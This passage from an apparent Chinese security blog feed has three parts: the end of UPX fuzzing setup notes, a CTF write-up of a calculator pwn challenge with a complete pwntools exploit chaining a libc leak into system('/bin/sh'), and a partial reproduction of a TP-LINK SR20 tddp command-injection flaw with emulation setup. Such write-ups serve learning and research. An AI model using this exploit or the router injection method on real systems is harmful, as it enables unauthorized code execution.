fuzz-upx</span><br><span class="line">git clone https://github.com/upx/upx.git</span><br><span class="line">wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gz</span><br><span class="line">tar zxvf ucl-1.03.tar.gz</span><br><span class="line">cd ucl-1.03</span><br><span class="line">./configure CPPFLAGS=&quot;$CPPFLAGS -std=c90 -fPIC&quot;</span><br><span class="line"></span><br><span class="line">cd upx</span><br><span class="line">export CC=/usr/local/bin/afl-gcc </span><br><span class="line">export CXX=/usr/local/bin/afl-g++</span><br><span class="line">export UPX_UCCLDIR=&quot;/home/chen/fuzz-upx/ucl-1.03&quot;</span><br><span class="line">export UPX_LZMADIR=&quot;/home/chen/fuzz-upx/upx/vendor/lzma-sdk/&quot;</span><br><span class="line">上面这一步要注意一下  upx高版本和低版本的lzma-sdk存放位置不同 我的指令是高版本的</span><br><span class="line">make all</span><br><span class="line"></span><br><span class="line">在.bashrc文件中加上</span><br><span class="line">export PATH=$PATH:/home/chen/fuzz-upx/upx/build/release</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>在开始对upx模糊测试之前 我们不能像之前一样随便给几个样本 样本收集对于fuzz来说至关重要</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <id>http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</id>
    <published>2023-10-13T12:07:16.000Z</published>
    <updated>2023-10-17T05:02:16.827Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力<br>我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审</p><p>同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题</p><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF</span><br><span class="line">  char v5[264]; // [rsp+B0h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  while ( recv_data(v5, 0x100uLL) )</span><br><span class="line">    vuln(v5, v4);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数就是清空缓冲区以及设置闹钟 同时使用了一个while循环<br>先跟进一下recv_data这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_9D6(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char buf; // [rsp+1Fh] [rbp-11h] BYREF</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  memset(a1, 0, a2);</span><br><span class="line">  while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !check_opt(buf) &amp;&amp; !check_number(buf) )</span><br><span class="line">      error();</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过单次输入一个字节 随后对该字节进行判断 是否为数字或者运算符 然后存储到a1中<br>随后来看一下vuln函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall vuln(__int64 buf, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [rsp+1Fh] [rbp-11h]</span><br><span class="line">  __int64 buf2; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(a2, 0, 0xA0uLL);</span><br><span class="line">  buf2 = buf;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(buf + i);</span><br><span class="line">    if ( !check_opt(v3) )                       // 如果不是opt就返回0 即退出for循环</span><br><span class="line">      break;</span><br><span class="line">    deal_number(a2, buf2, i + buf);</span><br><span class="line">    if ( !check_number(*(i + 1 + buf)) )</span><br><span class="line">      error();</span><br><span class="line">    sub_CB1(a2, v3);</span><br><span class="line">    buf2 = i + 1 + buf;</span><br><span class="line">LABEL_8:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    goto LABEL_8;</span><br><span class="line">  deal_number(a2, buf2, i + buf);</span><br><span class="line">  while ( *a2 )</span><br><span class="line">    calc(a2);</span><br><span class="line">  return printf(&quot;%ld\n&quot;, a2[a2[3] + 3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑稍微复杂一点<br>仍然是一个逐字节处理 只有是操作符才能执行for循环中的函数<br>来跟进一下deal_number函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_BYTE *__fastcall sub_DC9(__int64 a1, const char *buf2, _BYTE *opt)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rcx</span><br><span class="line">  char old_opt; // [rsp+27h] [rbp-9h]</span><br><span class="line">  _BYTE *first_number; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *buf2 == &#x27;0&#x27; )</span><br><span class="line">    error();</span><br><span class="line">  old_opt = *opt;</span><br><span class="line">  *opt = 0;</span><br><span class="line">  first_number = strtol(buf2, 0LL, 10);</span><br><span class="line">  result = opt;</span><br><span class="line">  *opt = old_opt;</span><br><span class="line">  if ( first_number )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(a1 + 24);</span><br><span class="line">    *(a1 + 24) = v4 + 1;</span><br><span class="line">    v5 = v4 + 4;</span><br><span class="line">    result = first_number;</span><br><span class="line">    *(a1 + 8 * v5) = first_number;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断了是否为0 是则终止程序<br>随后利用strtol将字符串转化为长整型 存储在a1+32处 同时a1+24处自增1 当然这是第一次处理的情况 后面由于a1+24的值不为0了  所以数字存储的地址也会相应增加一个字长<br>sub_cb1函数是一个对于运算符的检查以及筛分后运算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_CB1(_QWORD *a1, char opt)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (*a1)++;</span><br><span class="line">    *(a1 + result + 8) = opt;</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( opt != &#x27;+&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( opt &lt;= &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )                         // 这边是*的跳转</span><br><span class="line">LABEL_16:</span><br><span class="line">        error();</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( opt != &#x27;-&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;/&#x27; )</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">LABEL_8:</span><br><span class="line">      if ( sub_91A(*(a1 + *a1 + 7)) )           // *(a1 + *a1 + 7)也就是运算符 sub_91A用来进一步检查是否为*和/</span><br><span class="line">        calc(a1);</span><br><span class="line">      if ( *a1 &gt; 0xEuLL )</span><br><span class="line">        error();</span><br><span class="line">      result = (*a1)++;</span><br><span class="line">      *(a1 + result + 8) = opt;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  calc(a1);</span><br><span class="line">  if ( *a1 &gt; 0xEuLL )</span><br><span class="line">    error();</span><br><span class="line">  result = (*a1)++;</span><br><span class="line">  *(a1 + result + 8) = opt;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后calc函数应该很容易就能看出来是干啥的 这里的a1数组后面我们再仔细分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_QWORD *__fastcall sub_AC7(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line">  int opt; // eax</span><br><span class="line"></span><br><span class="line">  result = *a1;</span><br><span class="line">  if ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    opt = *(a1 + --*a1 + 8);</span><br><span class="line">    if ( opt == &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[a1[3] + 2] += a1[a1[3] + 3];           // a1[a1[3] + 2]为第一个number</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( opt &gt; &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt == &#x27;-&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        a1[a1[3] + 2] -= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( opt != &#x27;/&#x27; )</span><br><span class="line">LABEL_15:</span><br><span class="line">          error();</span><br><span class="line">        if ( !a1[a1[3] + 3] )</span><br><span class="line">          error();</span><br><span class="line">        a1[a1[3] + 2] /= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )</span><br><span class="line">        goto LABEL_15;</span><br><span class="line">      a1[a1[3] + 2] *= a1[a1[3] + 3];</span><br><span class="line">    &#125;</span><br><span class="line">    result = a1;</span><br><span class="line">    --a1[3];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上面的分析 我们大概可以推理出这样一个大概的流程<br>比如 输入1+2<br>首先针对1进行判断 非运算符 所以跳出for循环 但是执行到下面的if的时候 又跳回到了if循环中<br>此时i自增1 也就是判断下一个字符 即+<br>+可以通过判断 此时第一次执行deal_number函数<br>而其第二个参数buf2 此时仍然执行buf首地址 也就是第一个数字<br>于是这里就存储第一个数字到了a1数组中对应的地址 也就是a1+32<br>随后检查下一个字符是否为数字 如果不是则终止程序<br>同时更改了buf2 使其指向2数字位于的地址<br>随后就因为第四个字节为空 此时就算真正跳出了for循环<br>此时再次执行deal_number 也就是对于第二个数字进行存储<br>随后进入calc函数执行操作<br>这里的a1[a1[3] + 2] 我们拆开分析 a1[3]显然是deal_number函数中的v4 在执行两次后 其变成了2 而最后得到的a1[4]就是第一个数字存储的地址 第二个则为a1[5]<br>完整的一个流程应该是这样的 看起来没有什么可以利用的漏洞点<br>但是如果我们输入的是+52会怎么样<br>其会直接进入if分支 随后执行deal_number函数 而此时的buf2指向的是运算符<br>而strtol函数是无法转化运算符的 也就是说其返回值为空 那么第一个数字的存储就失败了<br>随后只会存储52这个数字到a2+32的位置<br>随后执行到calc函数的时候 由于a2[3]此时才为1 所以就相当于a2[3]被增加到了53<br>而最后的printf语句就是根据a2[3]来索引的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;%ld\n&quot;, a2[a2[3] + 3])</span><br></pre></td></tr></table></figure><p>所以漏洞就出现在这里 可以实现一个栈上内容的泄露<br>泄露出libc_start_main的地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" alt="image.png"></a><br>在得到了libc地址后  我们可以利用同样的办法来操控a2[3]的值 同时可以利用deal_number函数中的strtol函数把str型的system这类地址 转化到栈上 从而可以构建出一条执行链 随后输入空字符 就可以跳出while循环 从而使程序执行到leave ret<br>完整exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">#io = remote(&quot;121.12.85.23&quot;,50532)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">#context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;+52&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(&quot;\n&quot;,drop = True),10)-0x24083</span><br><span class="line"></span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;+54+&quot;+str(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = &quot;+53+&quot;+str(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">rdi_addr = libc.address + 0x0000000000023b6a</span><br><span class="line"></span><br><span class="line">payload = &quot;+52+&quot;+str(rdi_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ret_addr = rdi_addr+1</span><br><span class="line"></span><br><span class="line">payload = &quot;+51+&quot;+str(ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1054)&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>TP-LINK SR20漏洞复现</title>
    <link href="http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-10-08T08:50:13.000Z</published>
    <updated>2023-10-12T15:41:41.559Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个涉及到了通信协议的洞 还是比较有趣的  以此来顺便丰富一下对于协议洞的认知<br>固件下载地址: <a href="https://www.tp-link.com/us/support/download/sr20/#Firmware">https://www.tp-link.com/us/support/download/sr20/#Firmware</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质上是一个任意命令执行 不过传入的方式和以前复现过的不一样在于 是通过recvform接收到了对应端口传输的数据<br>找到官方报告中 漏洞位于的&#x2F;usr&#x2F;bin&#x2F;tddp文件<br>是32位的arm架构<br>ida打开后没有找到main函数 通过start函数来索引到main函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // r3</span><br><span class="line">  int v4; // r0</span><br><span class="line">  int v6; // [sp+Ch] [bp-8h]</span><br><span class="line">  int v7; // [sp+Ch] [bp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = mem_calloc(argc, argv, envp);</span><br><span class="line">  if ( v6 )</span><br><span class="line">    return v6;</span><br><span class="line">  v4 = sub_936C();</span><br><span class="line">  v7 = delete_mem(v4);</span><br><span class="line">  if ( v7 )</span><br><span class="line">    v3 = v7;</span><br><span class="line">  else</span><br><span class="line">    v3 = 0;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要有三个函数 首尾两个函数的作用我已经更改了函数名 就是简单的开辟空间和释放空间<br>重点跟进一下936c这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_936C()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // r4</span><br><span class="line">  int optval; // [sp+Ch] [bp-B0h] BYREF</span><br><span class="line">  int v3; // [sp+10h] [bp-ACh] BYREF</span><br><span class="line">  struct timeval timeout; // [sp+14h] [bp-A8h] BYREF</span><br><span class="line">  fd_set readfds; // [sp+1Ch] [bp-A0h] BYREF</span><br><span class="line">  _DWORD *v6; // [sp+9Ch] [bp-20h] BYREF</span><br><span class="line">  int v7; // [sp+A0h] [bp-1Ch]</span><br><span class="line">  int nfds; // [sp+A4h] [bp-18h]</span><br><span class="line">  fd_set *v9; // [sp+A8h] [bp-14h]</span><br><span class="line">  unsigned int i; // [sp+ACh] [bp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  v3 = 1;</span><br><span class="line">  optval = 1;</span><br><span class="line">  printf(&quot;[%s():%d] tddp task start\n&quot;, &quot;tddp_taskEntry&quot;, 151);</span><br><span class="line">  if ( !sub_16ACC(&amp;v6)</span><br><span class="line">    &amp;&amp; !sub_16E5C(v6 + 9)</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 2, &amp;optval, 4u)</span><br><span class="line">    &amp;&amp; !sub_16D68(v6[9], 1040)                  // 绑定1040端口</span><br><span class="line">    &amp;&amp; !setsockopt(v6[9], 1, 6, &amp;v3, 4u) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[11] |= 2u;</span><br><span class="line">    v6[11] |= 4u;</span><br><span class="line">    v6[11] |= 8u;</span><br><span class="line">    v6[11] |= 0x10u;</span><br><span class="line">    v6[11] |= 0x20u;</span><br><span class="line">    v6[11] |= 0x1000u;</span><br><span class="line">    v6[11] |= 0x2000u;</span><br><span class="line">    v6[11] |= 0x4000u;</span><br><span class="line">    v6[11] |= 0x8000u;</span><br><span class="line">    v6[12] = 60;</span><br><span class="line">    v0 = v6;</span><br><span class="line">    v0[13] = sub_9340();                        // 获取时间</span><br><span class="line">    v9 = &amp;readfds;</span><br><span class="line">    for ( i = 0; i &lt;= 0x1F; ++i )</span><br><span class="line">      v9-&gt;__fds_bits[i] = 0;</span><br><span class="line">    nfds = v6[9] + 1;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        timeout.tv_sec = 600;</span><br><span class="line">        timeout.tv_usec = 0;</span><br><span class="line">        readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F);</span><br><span class="line">        v7 = select(nfds, &amp;readfds, 0, 0, &amp;timeout);</span><br><span class="line">        if ( sub_9340() - v6[13] &gt; v6[12] )</span><br><span class="line">          v6[8] = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 == -1 );</span><br><span class="line">      if ( !v7 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ((readfds.__fds_bits[v6[9] &gt;&gt; 5] &gt;&gt; (v6[9] &amp; 0x1F)) &amp; 1) != 0 )</span><br><span class="line">        sub_16418(v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_16E0C(v6[9]);</span><br><span class="line">  sub_16C18(v6);</span><br><span class="line">  return printf(&quot;[%s():%d] tddp task exit\n&quot;, &quot;tddp_taskEntry&quot;, 219);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用socket来实现通讯<br>sub_16D68函数中 绑定了1040端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_16D68(int a1, uint16_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // r3</span><br><span class="line">  struct sockaddr s; // [sp+8h] [bp-14h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, sizeof(s));</span><br><span class="line">  s.sa_family = 2;</span><br><span class="line">  *&amp;s.sa_data[2] = htonl(0);</span><br><span class="line">  *s.sa_data = htons(a2);</span><br><span class="line">  if ( bind(a1, &amp;s, 0x10u) == -1 )</span><br><span class="line">    v2 = sub_13018(-10103, &quot;failed to bind socket&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 = 0;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时把主机字节序转化成了网络字节序 用来方便不同设备之间的统一通讯<br>随后会进入sub_16418函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091017618.png" alt="image.png"></a><br>该函数旨在接收1040端口传输来的数据<br>这里注意一下数据包存放的缓冲区地址为 a1+45083 而v2作为一个指针指向该地址<br>对于v2进行了一个检测 如果为1则进入分支<br>这里涉及到了dttp这个协议 其为D-LINK所使用的一种简单的调试协议<br>分为v1和v2两个版本<br>版本号会放在数据包首地址来作为区分<br>随后还会有一个用来表示类型的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4：CMD_AUTO_TEST   6: CMD_CONFIG_MAC   7: CMD_CANCEL_TEST</span><br><span class="line">8: CMD_REBOOT_FOR_TEST   0XA:CMD_GET_PROD_ID   0XC: CMD_SYS_INIT </span><br><span class="line">0XD: CMD_CONFIG_PIN   0X30: CMD_FTEST_USB   0X31: CMD_FTEST_CONFIG</span><br></pre></td></tr></table></figure><p>也就是我们在sub_15E74函数中所看到的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091021475.png" alt="image.png"></a><br>这里借用winmt师傅的图来方便理解包的形式<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091022913.png" alt="image.png"></a><br>ver为版本号 type则为包的类型<br>本次的漏洞出现在0x31对应的类型中 我们找到对应的函数进行跟进<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310091031214.png" alt="image.png"></a><br>其以;进行了正则匹配 将两段字符串分别存储到s和v10中 随后进行了命令执行<br>那么这里仅仅过滤了一个;字符 我们也可以使用|和&amp;来达到任意命令执行的目的<br>上述为第一种漏洞的利用途径 接下来还有一个通过lua脚本达到任意命令执行的洞<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102246660.png" alt="image.png"></a><br>可以看到 s是由我们所控制的 其作为一个路径的一部分 用来指向一个lua脚本<br>并且如果这个lua脚本存在 就可以执行这个脚本<br>我们再来看一下原本要执行的指令<br>其为 <strong>tftp -gr xxxx host</strong><br>host为宿主机与虚拟机通信的接口ip<br>我们只需要在宿主机启动tftp服务 随后篡改xxxx为正确的文件名 就可以实现任意脚本执行了</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用readelf可以得到是32位小端序的arm架构 这里使用armhf 不适用armel是因为其缺少硬件浮点数支持<br>搭建脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line"></span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line"></span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line"></span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line"></span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line"></span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line"></span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>我这里的硬盘映像文件虽然是直接从官网下的 但是不知道什么原因 在模拟的时候会提示说硬盘大小出现问题<br>所以这里按照描述更改映像文件为32G即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</span><br></pre></td></tr></table></figure><p>随后就可以成功启动模拟 进入后将eth0接口更改 使其与tap1位于同一c段<br>随后挂载两个文件夹并且设置squashfs-root为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root/ sh</span><br></pre></td></tr></table></figure><p>启动tddp程序<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102144951.png" alt="image.png"></a><br>接着回到宿主机 这里如果直接nc 1040这个端口是无法连接的<br>我们需要借助nmap的udp扫描方式<br>可以看到这个端口是有过滤的<br>等下使用脚本复现的时候也要注意一下socket需要调整为UDP<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102145130.png" alt="image.png"></a><br>随后在宿主机上安装tftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install atftpd</span><br></pre></td></tr></table></figure><p>随后需要进行两次配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/xinetd.d/tftp</span><br><span class="line"></span><br><span class="line">service tftp  </span><br><span class="line">&#123;  </span><br><span class="line">socket_type = dgram  </span><br><span class="line">protocol = udp  </span><br><span class="line">wait = yes  </span><br><span class="line">user = root  </span><br><span class="line">server = /usr/sbin/in.tftpd  </span><br><span class="line">server_args = -s /tftpboot -c   这个文件夹我试过放到用户目录下 